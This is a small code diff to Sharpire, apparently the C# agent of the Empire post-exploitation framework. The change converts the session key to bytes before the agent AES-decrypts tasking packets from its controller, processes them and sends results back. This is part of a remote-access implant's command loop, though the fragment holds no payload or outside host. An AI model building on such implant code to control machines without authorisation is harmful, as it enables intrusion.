@@ -184,7 +184,7 @@ namespace Sharpire
 
         private void ProcessTaskingPackets(byte[] encryptedTask)
         {
-            byte[] taskingBytes = EmpireStager.aesDecrypt(sessionInfo.GetSessionKey(), encryptedTask);
+            byte[] taskingBytes = EmpireStager.aesDecrypt(Encoding.ASCII.GetBytes(sessionInfo.GetSessionKey()), encryptedTask);
             PACKET firstPacket = DecodePacket(taskingBytes, 0);
             byte[] resultPackets = ProcessTasking(firstPacket);
             SendMessage(resultPackets);
